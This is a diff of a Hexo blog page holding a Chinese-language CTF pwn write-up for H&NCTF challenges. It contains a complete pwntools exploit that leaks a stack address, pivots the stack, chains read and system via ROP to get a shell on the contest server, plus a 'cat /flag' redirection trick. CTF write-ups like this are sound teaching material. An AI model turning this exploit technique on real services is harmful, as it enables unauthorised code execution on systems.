@@ -19,15 +19,15 @@
         <meta name="keywords" content="hexo,hexo-theme,hexo-blog">
     
     <meta name="description" content="">
-    <meta name="description" content="close关闭了标准输出流，直接cat &#x2F;flag 1&gt;&amp;0就可以了 ez_pwn%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以read一次后重启main再调用system就好了 1234567891011121314151617181920212">
+    <meta name="description" content="题目附件https:&#x2F;&#x2F;github.com&#x2F;nyyyddddn&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;hnctf_pwn close关闭了标准输出流，直接cat &#x2F;flag 1&gt;&amp;0就可以了 ez_pwn%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以rea">
 <meta property="og:type" content="article">
 <meta property="og:title" content="hnctf_pwn">
 <meta property="og:url" content="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/index.html">
 <meta property="og:site_name" content="nyyyddddn">
-<meta property="og:description" content="close关闭了标准输出流，直接cat &#x2F;flag 1&gt;&amp;0就可以了 ez_pwn%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以read一次后重启main再调用system就好了 1234567891011121314151617181920212">
+<meta property="og:description" content="题目附件https:&#x2F;&#x2F;github.com&#x2F;nyyyddddn&#x2F;ctf&#x2F;tree&#x2F;main&#x2F;hnctf_pwn close关闭了标准输出流，直接cat &#x2F;flag 1&gt;&amp;0就可以了 ez_pwn%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以rea">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2024-05-15T10:44:05.000Z">
-<meta property="article:modified_time" content="2024-05-15T10:56:49.153Z">
+<meta property="article:modified_time" content="2024-09-05T13:58:23.581Z">
 <meta property="article:author" content="nyyyddddn">
 <meta property="article:tag" content="ctf writeup">
 <meta name="twitter:card" content="summary">
@@ -491,7 +491,8 @@
             <div class="container container-unloaded">
                 <main class="main post-page">
     <article class="article-entry">
-        <h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>关闭了标准输出流，直接<code>cat /flag 1&gt;&amp;0</code>就可以了</p>
+        <p>题目附件<a target="_blank" rel="noopener" href="https://github.com/nyyyddddn/ctf/tree/main/hnctf_pwn">https://github.com/nyyyddddn/ctf/tree/main/hnctf_pwn</a></p>
+<h2 id="close"><a href="#close" class="headerlink" title="close"></a>close</h2><p>关闭了标准输出流，直接<code>cat /flag 1&gt;&amp;0</code>就可以了</p>
 <h2 id="ez-pwn"><a href="#ez-pwn" class="headerlink" title="ez_pwn"></a>ez_pwn</h2><p>%s 泄露buf的地址后覆盖rbp栈迁移后打rop就好了，由于32位的调用约定，不能以连续的ret结尾的gadget去rop，然后system不能直接传binsh过去，得传;sh，所以read一次后重启main再调用system就好了</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line">IP = <span class="string">&quot;hnctf.imxbt.cn&quot;</span></span><br><span class="line">PORT = <span class="number">29342</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    <span class="keyword">return</span> remote(IP, PORT) <span class="keyword">if</span> <span class="keyword">not</span> is_debug <span class="keyword">else</span> process()</span><br><span class="line"></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x=<span class="literal">None</span>: p.recv() <span class="keyword">if</span> x <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span>: p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">r_leak_libc_64 = <span class="keyword">lambda</span>: u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">r_leak_libc_32 = <span class="keyword">lambda</span>: u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"></span><br><span class="line">p = connect()</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x2c</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">leak = u32(r(<span class="number">4</span>))</span><br><span class="line">buf_addr = leak - (<span class="number">0xfff93748</span> - <span class="number">0xfff93710</span>)</span><br><span class="line">success(<span class="string">f&quot;buf_addr -&gt;<span class="subst">&#123;<span class="built_in">hex</span>(buf_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">vuln = <span class="number">0x08048639</span></span><br><span class="line">bss = <span class="number">0x804a000</span></span><br><span class="line">system = <span class="number">0x0804857D</span></span><br><span class="line"></span><br><span class="line">payload = p32(read) + p32(vuln) + p32(<span class="number">0</span>) + p32(bss) + p32(<span class="number">0x4</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">time.sleep(<span class="number">0.3</span>)</span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(<span class="string">b&#x27;sh;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&quot;Welcome to H&amp;NCTF, my friend. What&#x27;s your name?&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">0x4</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(payload)</span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr</span><br><span class="line">success(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = buf_addr - (<span class="number">0xffb45f80</span> - <span class="number">0xffb45f4c</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(system) + p32(bss) + p32(bss)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2c</span>,<span class="string">b&#x27;a&#x27;</span>) + p32(buf_addr - <span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <h2 id="idea"><a href="#idea" class="headerlink" title="idea"></a>idea</h2><p>格式化字符串泄露canary后和ez_pwn一样的流程，不过libc小版本的差异远程打不通，可以用libc searcher解决这个问题</p>
@@ -509,7 +510,7 @@
             <p>Author：<a href="https://nyyyddddn.github.io">nyyyddddn</a>
             <p>Link：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/</a>
             <p>Publish date：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">May 15th 2024, 6:44:05 pm</a>
-            <p>Update date：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">May 15th 2024, 6:56:49 pm</a>
+            <p>Update date：<a href="https://nyyyddddn.github.io/2024/05/15/hnctf-pwn/">September 5th 2024, 9:58:23 pm</a>
             <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -944,7 +945,54 @@
         
         
         
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
     
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
         
         
         
@@ -1437,7 +1485,7 @@
     
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 54
+        Total : 57
         </div>
         <!-- search  -->
         
@@ -1733,13 +1781,31 @@
         
         <li class="archive-post-item">
             <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
+            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
         </li>
     
         
         <li class="archive-post-item">
             <span class="archive-post-date">12/28</span>
-            <a class="archive-post-title" href="/2023/12/28/moectf-wp/">moectf_wp</a>
+            <a class="archive-post-title" href="/2023/12/28/newstar2023-week1/">newstar2023_week1</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/29</span>
+            <a class="archive-post-title" href="/2023/11/29/isctf/">isctf</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/05</span>
+            <a class="archive-post-title" href="/2023/11/05/newstar-week2/">newstar_week2</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/21</span>
+            <a class="archive-post-title" href="/2023/10/21/0xgame/">0xgame</a>
         </li>
     
         
